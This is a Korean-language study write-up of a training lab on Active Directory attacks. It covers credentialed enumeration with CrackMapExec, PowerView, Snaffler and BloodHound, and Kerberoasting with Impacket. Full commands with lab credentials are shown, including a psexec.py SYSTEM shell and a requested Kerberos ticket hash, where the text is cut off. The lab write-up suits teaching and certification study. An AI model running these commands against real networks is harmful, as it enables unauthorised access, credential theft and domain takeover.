---
title: "Active Directory - Credentialed Enumeration and Kerberos Attacks"
date: 2026-08-04
layout: single
excerpt: "Active Directory 환경에서 확보한 자격 증명으로 SMB, LDAP, PowerView, BloodHound 기반 열거를 수행하고, 로그온 사용자와 권한 경로를 분석한 뒤 Impacket, NetExec, Rubeus를 이용한 Kerberoasting으로 고권한 서비스 계정까지 확장하는 과정을 정리한다."
author_profile: true
toc: true
toc_label: "Active Directory"
toc_icon: "book"
toc_sticky: true
categories: [cpts-infra]
tags: [cpts, active-directory, kerberos, kerberoasting, enumeration]
---

Active Directory 환경에서 확보한 자격 증명으로 SMB, LDAP, PowerView, BloodHound 기반 열거를 수행하고, 로그온 사용자와 권한 경로를 분석한 뒤 Impacket, NetExec, Rubeus를 이용한 Kerberoasting으로 고권한 서비스 계정까지 확장하는 과정을 정리한다.

# Deeper Down the Rabbit Hole

패스워드 스프레이와 기본 열거를 통해 몇 개의 유효한 계정을 확보했으므로, 이제 자격 증명을 활용해 내부 환경을 더 깊게 열거하고 낮은 권한에서 높은 권한으로 이어질 수 있는 경로를 찾아본다.

Linux에서는 CrackMapExec/NetExec 계열 도구를 활용하면 SMB, LDAP 등의 서비스를 기준으로 호스트와 권한을 빠르게 확인할 수 있다.

### SMB Enumeration and Local Admin Access

우선 이전에 확보한 `wley` 계정을 기준으로 SMB 열거를 진행하였다:

```bash
$ crackmapexec smb 172.16.5.0/23 -u wley -p transporter@4         

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 (Pwn3d!)
```

`172.16.5.130` 에서 `Pwn3d!` 가 표시되었다. 이는 `wley` 자격 증명이 해당 호스트에서 관리자 권한으로 인증되었음을 의미한다.

또한 해당 호스트는 `INLANEFREIGHT.LOCAL` 도메인에 가입된 `ACADEMY-EA-FILE` 서버임을 확인할 수 있다.

따라서 SMB 445/TCP를 통해 원격 서비스 생성이 가능한 경우 `psexec.py` 를 이용해 명령 실행을 시도할 수 있다.

실제로 접속을 시도하였다:

```bash
$ psexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.130                                              

Microsoft Windows [Version 10.0.17763.2237]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

`psexec.py` 가 관리자 권한을 이용해 원격 서비스를 생성하고 그 서비스를 `NT AUTHORITY\SYSTEM` 으로 실행했기 때문에 SYSTEM 셸이 반환되었다.

### Logged-on User Enumeration

추가로 해당 호스트에 존재하는 로그온 세션도 열거할 수 있다:

```bash
$ crackmapexec smb 172.16.5.130 -u wley -p transporter@4 --loggedon-users               

SMB         172.16.5.130    445    ACADEMY-EA-FILE  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-FILE) (domain:INLANEFREIGHT.LOCAL) (signing:False) (SMBv1:False)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] INLANEFREIGHT.LOCAL\wley:transporter@4 (Pwn3d!)
SMB         172.16.5.130    445    ACADEMY-EA-FILE  [+] Enumerated loggedon users
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend                    logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\backupagent               logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\lab_adm                   logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend                    logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\wley                      logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\clusteragent              logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\forend                    logon_server: ACADEMY-EA-DC01                                                                                                             
SMB         172.16.5.130    445    ACADEMY-EA-FILE  INLANEFREIGHT\svc_qualys                logon_server: ACADEMY-EA-DC01
```

출력에는 여러 도메인 계정의 로그온 정보가 나타난다. 

다만 `--loggedon-users` 결과에는 대화형 로그인뿐 아니라 서비스나 기타 로그온 세션이 포함될 수 있고, 동일 계정이 중복해서 보일 수도 있다.

### LDAP and Domain Admin Enumeration

앞에서 확인한 `ACADEMY-EA-DC01` 은 `172.16.5.5` 이며, Nmap 결과를 통해 LDAP를 포함한 Active Directory 서비스가 동작하고 있음을 확인하였다.

따라서 `wley` 자격 증명으로 LDAP 바인드가 가능한지 확인하였다:

```bash
$ crackmapexec ldap 172.16.5.5 -u wley -p transporter@4  

LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
LDAP        172.16.5.5      389    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\wley:transporter@4
```

정상적으로 LDAP 인증이 성공하였다. 

즉, `wley` 계정으로 LDAP를 조회할 수 있으며 계정에 허용된 범위 안에서 AD 객체를 열거하거나 BloodHound 수집을 수행할 수 있다.

추가로 [windapsearch](https://github.com/ropnop/windapsearch)를 사용하여 LDAP를 직접 조회하고 Domain Admins 구성원을 열거할 수 있다:

```bash
$ python3 windapsearch.py --dc-ip 172.16.5.5 -u wley@inlanefreight.local -p transporter@4 --da      

# SKIP

[+] Attempting to enumerate all Domain Admins
[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
[+]     Found 28 Domain Admins:

cn: Administrator
userPrincipalName: administrator@inlanefreight.local

cn: lab_adm

cn: Matthew Morgan
userPrincipalName: mmorgan@inlanefreight.local

cn: Dorothy Click
userPrincipalName: dclick@inlanefreight.local

cn: Betty Ross
userPrincipalName: bross@inlanefreight.local

cn: John Hermann
userPrincipalName: jhermann@inlanefreight.local

cn: Charlie Obando
userPrincipalName: Intinted@inlanefreight.local

cn: Maggie Jablonski
userPrincipalName: Spong1990@inlanefreight.local

cn: Matthew Mackey
userPrincipalName: Fastally@inlanefreight.local

cn: Christopher Taylor
userPrincipalName: Buithe@inlanefreight.local

cn: Johnnie Munoz
userPrincipalName: Pratch@inlanefreight.local

cn: Melissa Jason
userPrincipalName: Ressoare@inlanefreight.local

cn: Danielle Hawkins
userPrincipalName: Grewle@inlanefreight.local

cn: Ruby Cropper
userPrincipalName: Betion@inlanefreight.local

cn: Mary Clifton
userPrincipalName: Thisfic@inlanefreight.local

cn: Betty Turcotte
userPrincipalName: Coultle@inlanefreight.local

cn: mrb3n

cn: Jessica Systemmailbox 8Cc370d3-822A-4Ab8-A926-Bb94bd0641a9

cn: clustergent

cn: LDAP.AGENT

cn: NAGIOSAGENT

cn: BACKUPAGENT

cn: SOLARWINDSMONITOR

cn: PROXYAGENT

cn: FREIGHTLOGISTICSUSER

cn: Sharepoint Admin
userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL

cn: sqldev

cn: svc_qualys
```

여기서 눈여겨볼 점은 `ACADEMY-EA-FILE` 의 로그온 정보에서 확인했던 `svc_qualys` 계정이 Domain Admins 열거 결과에도 포함되어 있다는 것이다.

따라서 파일 서버에서 `svc_qualys` 의 재사용 가능한 자격 증명이나 인증 재료를 확보할 수 있다면, 해당 Domain Admin 권한을 이용해 도메인 전체로 권한을 확장할 가능성이 생긴다.

## Credentialed Enumeration - from Windows

### ActiveDirectory Module

Windows에서는 Microsoft의 [ActiveDirectory](https://learn.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2025-ps) PowerShell 모듈을 사용하여 AD 객체를 직접 열거할 수 있다.

모듈에서 제공하는 명령어는 다음과 같이 확인할 수 있다:

```powershell
PS C:\Users\htb-student> get-command -module activedirectory

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Add-ADCentralAccessPolicyMember                    1.0.1.0    activedirectory
Cmdlet          Add-ADComputerServiceAccount                       1.0.1.0    activedirectory
Cmdlet          Add-ADDomainControllerPasswordReplicationPolicy    1.0.1.0    activedirectory
```

먼저 현재 도메인의 기본 정보를 확인할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad1.png)

또한 SPN이 설정된 사용자 계정을 열거할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad2.png)

사용자 계정에 SPN이 등록되어 있다면 Kerberoasting의 대상이 될 수 있다.

Trust 정보를 확인하면 현재 도메인과 신뢰 관계를 맺고 있는 다른 도메인이나 포레스트도 확인할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad3.png)

이 결과를 통해 현재 도메인 외에 어떤 신뢰 관계가 존재하는지 확인하고 열거 범위를 확장할 수 있다.

또한 그룹 목록과 특정 그룹의 구성원을 확인할 수 있다:

```powershell
PS C:\Users\htb-student> Get-ADGroup -Filter * | select name

PS C:\Users\htb-student> Get-ADGroupMember -Identity "Backup Operators"
```

### PowerView and Trust Enumeration

ActiveDirectory 모듈 외에도 AD 열거에 널리 사용되는 PowerView가 존재한다.

우선 PowerView 모듈을 임포트한다:

```powershell
PS C:\Tools> Import-Module .\PowerView.ps1
```

이후 특정 사용자 정보를 열거할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad4.png)

또한 `Domain Admins` 그룹의 구성원을 재귀적으로 확인할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad5.png)

재귀 열거를 사용하면 직접 구성원뿐 아니라 중첩된 그룹을 통해 Domain Admins 권한을 상속받는 사용자까지 확인할 수 있다.

예를 들어 화면의 `Secadmins` 그룹은 `Domain Admins` 에 중첩되어 있으며, 그 안의 사용자들은 해당 중첩 멤버십을 통해 Domain Admins의 권한을 갖게 된다.

즉, 사용자가 `Domain Admins` 에 직접 추가되어 있지 않더라도 중첩 그룹 경로를 통해 동일한 고권한을 가질 수 있다.

PowerView를 이용해 도메인 Trust 관계도 확인할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad6.png)

결과를 보면 `LOGISTICS.INLANEFREIGHT.LOCAL` 은 동일한 `INLANEFREIGHT.LOCAL` 포레스트 내부의 자식 도메인이며, `FREIGHTLOGISTICS.LOCAL` 은 별도의 포레스트와 맺어진 Forest Trust 관계임을 확인할 수 있다.

### Snaffler

AD 객체 열거뿐 아니라 공유 폴더에서 암호, SSH 키, 구성 파일 등 민감한 파일을 탐색하는 `Snaffler.exe` 도 사용할 수 있다:

```powershell
PS C:\Tools> .\Snaffler.exe  -d INLANEFREIGHT.LOCAL -s -v data

2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\ADMIN$)
2022-03-31 12:16:54 -07:00 [Share] {Black}(\\ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL\C$)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-MX01.INLANEFREIGHT.LOCAL\address)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\User Shares)
2022-03-31 12:16:54 -07:00 [Share] {Green}(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\ZZZ_archive)
2022-03-31 12:17:18 -07:00 [Share] {Green}(\\ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL\CertEnroll)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kdb$|289B|3/31/2022 12:09:22 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\GroupBackup.kdb) .kdb
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|299B|3/31/2022 12:05:33 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ShowReset.key) .key
2022-03-31 12:17:19 -07:00 [Share] {Green}(\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\UpdateServicesPackages)
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.kwallet$|302B|3/31/2022 12:04:45 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\WriteUse.kwallet) .kwallet
2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\.key$|298B|3/31/2022 12:05:10 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\ProtectStep.key) .key
2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\.ppk$|275B|3/31/2022 12:04:40 PM>(\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\Department Shares\IT\Infosec\StopTrace.ppk) .ppk

# SKIP
```

이처럼 Snaffler는 접근 가능한 공유 디렉터리를 탐색하고 관심 있는 확장자나 파일 패턴을 찾아준다.

예를 들어 `web.config` 같은 구성 파일이나 키 파일에 자격 증명 또는 비밀 값이 저장되어 있다면 추가적인 자격 증명 확보로 이어질 수 있다.

### BloodHound and SharpHound

AD 객체 간 권한 관계를 시각적으로 분석하기 위해 SharpHound/BloodHound도 사용할 수 있다.

SharpHound로 수집한 데이터를 BloodHound에 넣으면 사용자, 그룹, 컴퓨터, ACL 등의 관계를 그래프로 확인하고 권한 상승 경로를 분석할 수 있다.

우선 데이터를 수집하였다:

```powershell
PS C:\Tools> .\SharpHound.exe -c All
```

이후 `wley` 를 기준으로 조회하면 다음과 같이 권한 관계가 나타난다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad7.png)

예를 들어 `wley` 가 `damundsen` 에 대해 `ForceChangePassword` 권한을 가지고 있음을 확인할 수 있다. 

이러한 ACL 관계를 다른 그룹 및 사용자 권한과 연결하면 최종적으로 더 높은 권한으로 이어지는 공격 경로를 찾을 수 있다.

## Living Off the Land

이전까지는 PowerView, BloodHound 같은 외부 도구를 사용했지만, 여기서는 인터넷 접근이나 추가 도구 업로드가 제한된 Windows 호스트에서 기본 제공 기능만으로 열거한다고 가정한다.

### Host and Network Information

먼저 운영체제에 기본 포함된 명령어로 호스트와 네트워크 정보를 확인할 수 있다.

`ipconfig /all` 을 사용하면 호스트명, 도메인, NIC, IP 주소, DNS 서버, 게이트웨이 등의 정보를 확인할 수 있다:

```powershell
*Evil-WinRM* PS C:\Users\htb-student> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : ACADEMY-EA-MS01
   Primary Dns Suffix  . . . . . . . : INLANEFREIGHT.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : INLANEFREIGHT.LOCAL
                                       .htb

Ethernet adapter Ethernet1:

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter #2
   Physical Address. . . . . . . . . : A2-DE-AD-34-15-96
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::1579:2e43:fb24:1874%8(Preferred)
   IPv4 Address. . . . . . . . . . . : 172.16.5.25(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.254.0
   Default Gateway . . . . . . . . . : 172.16.5.1
   DHCPv6 IAID . . . . . . . . . . . : 419450966
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-32-10-51-3F-A2-DE-AD-05-4F-21
   DNS Servers . . . . . . . . . . . : 172.16.5.5
   NetBIOS over Tcpip. . . . . . . . : Disabled

Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : A2-DE-AD-05-4F-21
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::1468:2399:8601:f5e2(Preferred)
   Link-local IPv6 Address . . . . . : fe80::1468:2399:8601:f5e2%12(Preferred)
   IPv4 Address. . . . . . . . . . . : 10.129.109.121(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, August 05, 2026 9:26:19 PM
   Lease Expires . . . . . . . . . . : Thursday, August 05, 2026 10:24:52 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:4ced%12
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 100683862
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-32-10-51-3F-A2-DE-AD-05-4F-21
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

이를 통해 현재 호스트가 `ACADEMY-EA-MS01` 이며 `INLANEFREIGHT.LOCAL` 도메인에 가입되어 있고, `172.16.5.25` 와 `10.129.109.121` 두 네트워크 인터페이스를 가지고 있음을 확인할 수 있다.

설치된 Windows 패치와 Hotfix 목록도 확인할 수 있다:

```powershell
*Evil-WinRM* PS C:\Users\htb-student> wmic qfe get Caption,Description,HotFixID,InstalledOn
Caption                                     Description  HotFixID   InstalledOn

http://support.microsoft.com/?kbid=4464455  Update       KB4464455  10/29/2018
```

개별 항목을 하나씩 확인하는 대신 `systeminfo` 를 사용하면 OS 버전, 도메인, Hotfix, 네트워크 인터페이스 등 현재 호스트의 주요 정보를 한 번에 확인할 수 있다:

```powershell
*Evil-WinRM* PS C:\Users\htb-student> systeminfo

Host Name:                 ACADEMY-EA-MS01
OS Name:                   Microsoft Windows Server 2019 Standard
OS Version:                10.0.17763 N/A Build 17763
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00429-00521-62775-AA057
Original Install Date:     10/27/2021, 9:00:39 AM
System Boot Time:          8/05/2026, 9:25:59 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
                           [02]: AMD64 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.24504846.B64.2501180334, 1/18/2025
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     8,191 MB
Available Physical Memory: 6,981 MB
Virtual Memory: Max Size:  9,471 MB
Virtual Memory: Available: 8,224 MB
Virtual Memory: In Use:    1,247 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    INLANEFREIGHT.LOCAL
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: KB4464455
Network Card(s):           2 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.10.10.2
                                 IP address(es)
                                 [01]: 10.129.109.121
                                 [02]: fe80::1468:2399:8601:f5e2
                                 [03]: dead:beef::1468:2399:8601:f5e2
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 172.16.5.25
                                 [02]: fe80::1579:2e43:fb24:1874
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

### Security Controls

또한 현재 호스트의 Windows Firewall 상태를 확인할 수 있다:

```powershell
PS C:\Users\htb-student> netsh advfirewall show allprofiles

Domain Profile Settings:
----------------------------------------------------------------------
State                                 OFF
Firewall Policy                       BlockInbound,AllowOutbound
LocalFirewallRules                    N/A (GPO-store only)
LocalConSecRules                      N/A (GPO-store only)
InboundUserNotification               Disable
RemoteManagement                      Disable
UnicastResponseToMulticast            Enable

Logging:
LogAllowedConnections                 Disable
LogDroppedConnections                 Disable
FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
MaxFileSize                           4096

# SKIP
```

출력에서 Domain Profile의 `State` 가 `OFF` 이므로 해당 프로필의 방화벽 필터링은 현재 비활성화된 상태이다. 

`Firewall Policy` 값이 표시되더라도 프로필 자체가 꺼져 있다면 그 정책은 현재 적용되지 않는다.

Microsoft Defender 서비스의 실행 상태도 확인할 수 있다:

```powershell
PS C:\Users\htb-student> sc query windefend

SERVICE_NAME: windefend
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Defender의 세부 보호 상태는 [Get-MpComputerStatus](https://learn.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2025-ps)로 확인할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad8.png)

`WinDefend` 서비스 자체는 `RUNNING` 이지만, 화면에서는 `AMRunningMode` 가 `Not running` 이고 `RealTimeProtectionEnabled` 도 `False` 로 나타난다. 

즉, 서비스 프로세스가 존재하는 것과 실제 실시간 보호가 활성화되어 있는지는 별개로 확인해야 한다.

### Sessions and Network Discovery

`qwinsta` 를 사용하면 현재 호스트의 터미널 세션과 RDP 세션 상태를 확인할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad9.png)

이를 통해 다른 사용자의 활성 세션이 있는지 확인할 수 있으며, 침투 테스트 중 사용자 활동과 충돌할 가능성을 줄이거나 현재 사용 중인 계정을 파악하는 데 참고할 수 있다.

`arp -a` 는 현재 호스트의 ARP 캐시에 저장된 동일 L2 네트워크의 인접 IP와 MAC 주소를 확인하는 데 사용할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad10.png)

`route print` 를 이용하면 로컬 라우팅 테이블을 확인할 수 있다:

![Active Directory](/assets/cpts-infra/active-directory-credentialed-enumeration-and-kerberos-attacks/ad11.png)

여기서는 `172.16.4.0/23` 과 `10.129.0.0/16` 이 직접 연결된 네트워크로 보이며, 기본 게이트웨이도 확인할 수 있다. 

### Native Tools and LDAP Filters

외부 도구를 가져올 수 없는 환경에서는 [WMIC](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/wmic), `net.exe`, `sc.exe`, `ipconfig`, `arp`, `route` 같은 기본 도구를 조합하여 상당 부분의 초기 열거를 수행할 수 있다. 

또한 LDAP 검색에서는 Search Filter를 사용하여 원하는 객체나 속성을 조건에 맞게 조회할 수 있다.

예를 들어 LDAP 쿼리에서 사용자, 그룹, SPN 보유 계정 등의 조건을 필터로 지정하여 필요한 객체만 추출할 수 있다.

LDAP 검색 필터 문법은 Microsoft의 [LDAP Search Filter Syntax](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) 문서에서 확인할 수 있다.

# Cooking with Fire

## Kerberoasting - from Linux

### SPN Enumeration

앞에서 SPN이 설정된 사용자 계정들이 존재하는 것을 확인하였다.

Kerberos에서 클라이언트가 특정 SPN의 서비스 티켓(TGS)을 요청하면 KDC는 해당 서비스 계정의 장기 키로 암호화된 티켓을 발급한다. Kerberoasting은 이 티켓의 암호화된 부분을 가져와 오프라인에서 서비스 계정의 비밀번호를 추측하는 공격이다.

따라서 공격자가 도메인 사용자 자격 증명을 가지고 있다면 SPN이 등록된 사용자 계정을 열거하고 서비스 티켓을 요청할 수 있다.

Linux에서는 Impacket의 `GetUserSPNs.py` 를 사용할 수 있다:

```bash
$ GetUserSPNs.py INLANEFREIGHT.LOCAL/wley:'transporter@4' -dc-ip 172.16.5.5                                    

ServicePrincipalName                               Name               MemberOf                                                                                  PasswordLastSet             LastLogon                   Delegation 
-------------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  --------------------------  ----------
MSSQLSvc/ACADEMY-EA-DB01.INLANEFREIGHT.LOCAL:1433  damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2026-07-22 04:47:14.606617             
MSSQL/ACADEMY-EA-FILE                              damundsen          CN=VPN Users,OU=Security Groups,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL                         2022-03-24 12:20:34.127432  2026-07-22 04:47:14.606617             
backupjob/veam001.inlanefreight.local              backupagent        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  2026-07-22 05:00:31.331817             
sts/inlanefreight.local                            solarwindsmonitor  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>                                
MSSQLSvc/SPSJDB.inlanefreight.local:1433           sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>                                
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351      sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>                                
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433      sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>                                
adfsconnect/azure01.inlanefreight.local            adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>                                
testspn/kerberoast.inlanefreight.local             testspn                                                                                                      2022-02-27 15:15:43.406442  <never>                                
testspn2/kerberoast.inlanefreight.local            testspn2                                                                                                     2022-02-27 15:59:39.843945  <never>                                
http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL         certsvc                                                                                                      2022-03-30 15:44:18.414039  2022-03-30 15:50:53.679679             
vmware/inlanefreight.local                         svc_vmwaresso                                                                                                2022-04-05 15:32:46.799565  <never>                                
SAPService/srv01.inlanefreight.local               SAPService         CN=Account Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL                                 2022-04-18 14:40:02.959792  <never>  
```

이처럼 SPN이 등록된 사용자 계정과 서비스 정보를 확인할 수 있다.

### Requesting Service Tickets

`-request` 옵션을 사용하면 열거된 계정에 대해 실제 서비스 티켓을 요청하고, 오프라인 크랙에 사용할 수 있는 `$krb5tgs$...` 형식으로 출력할 수 있다.

특정 사용자만 대상으로 지정하려면 `-request-user` 를 사용할 수 있다:

```bash
$ GetUserSPNs.py INLANEFREIGHT.LOCAL/wley:'transporter@4' -dc-ip 172.16.5.5 -request-user testspn              

ServicePrincipalName                    Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
--------------------------------------  -------  --------  --------------------------  ---------  ----------
testspn/kerberoast.inlanefreight.local  testspn            2022-02-27 15:15:43.406442  <never>               

$krb5tgs$18$testspn$INLANEFREIGHT.LOCAL$*INLANEFREIGHT.LOCAL/testspn*$28ff39fcd75c4a2a5977eff1$cbccf581d475d175e727580a76d3234334610da8be8cfcd3b333e647e1ed909b1c31de2cb520ce36a63e81b36bc6a8bdbdfd33d3ce41f5fc31dd2f4dbe9dd7a90bbfc90a26339c16b4a31976f6d9f821bd492cf97d806c48e700a2e88457565ed5ee82c1e3bf59d967d8d18f1dd32bb6726b08c3b6a4981143f98abc15b4c51584c70dcf0f40891806d5acf153da6a754333e0c177bf808d2a1af2ec19f0f313b7fa46f7ffaa5a5913cb26b305d8b210335b32c450d7b8bcb81adb7ec0ed690253a46c2451cb99b1ab243e484658a4f0fd2848b901047b23e5fec09fc8ff96d5e1a0ee6cbe29fac7b9f9c1ba5555e09993cfcb98d4388e7147d726e24890b483eef8e016173078368dbe130cf8231c7d79508ae58ed40f4a9e8925cd8567d5bd6046423ad0411250cbe86c72e2edc392151363e0a50f50109cbf9c55f8d2931d9a3d505af3746c3689c841dd4e2cc0cca935468d865e8e715040f2b6713c623d614fa7626fb7ae655131bea683eaa72fde916caf2da7279752388de66fc3334fdc49c83fcae6d90eb0940a09a6081bf74dbd1cee1862b80ac396025b95a82d24c37c51d0ead6a60813d33ab2a68ec11c8c3a2c2422d7e0d93c62bff3f5d5ea16